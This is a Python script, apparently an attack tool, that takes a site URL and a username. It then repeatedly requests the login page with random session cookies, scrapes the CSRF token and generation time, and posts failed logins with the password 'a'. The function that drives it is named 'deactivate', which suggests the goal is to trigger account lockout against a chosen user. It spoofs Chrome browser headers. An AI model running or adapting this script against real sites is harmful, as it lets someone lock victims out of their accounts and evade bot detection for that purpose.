import requests
from random import randint
from itertools import chain, product
import string

cookieSymbols = string.ascii_letters + string.digits
passwordSymbols = string.ascii_letters + string.digits + string.punctuation
ready = False
headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-encoding': 'gzip, deflate, br','accept-language': 'nl-NL,nl;q=0.9,en-US;q=0.8,en;q=0.7,fr;q=0.6','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'none','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36'}

def checkIfIsUser(username, url):
    cookie = ""
    for n in range(0, 50):
        cookie += cookieSymbols[randint(0, len(cookieSymbols)-1)]
    cookies = {'PHPSESSID': cookie}
    headers["cookie"] = 'PHPSESSID='+cookie
    r = requests.get('https://'+url+'/login', cookies=cookies, headers=headers)
    try:
        index = r.text.index('login_form[_generationTime]')
    except ValueError:
        pass
        print("Error finding generation time")
    else:
        index += 64
        generationTime = ''
        character = r.text[index:index+1]
        while character != '"':
            generationTime += character
            index += 1
            character = r.text[index:index+1]
    try:
        index = r.text.index('login_form[_token]')
    except ValueError:
        pass
        print("Error finding form token")
    else:
        index += 55
        token = ''
        character = r.text[index:index+1]
        while character != '"':
            token += character
            index += 1
            character = r.text[index:index+1]
    pload = {'login_form[_username]': username,'login_form[_password]': 'a','login_form[_generationTime]': generationTime,'login_form[_token]': token}
    r = requests.post('https://'+url+'/login', data=pload, cookies=cookies, headers=headers)

def deactivate(url, name):
    print(url)
    print(name)
    for attempt in range(30):
        checkIfIsUser(name, url)
        if ready:
            break

if __name__ == '__main__':
    url = input("url: ")
    username = input("username: ")
    deactivate(url, username)
    exit()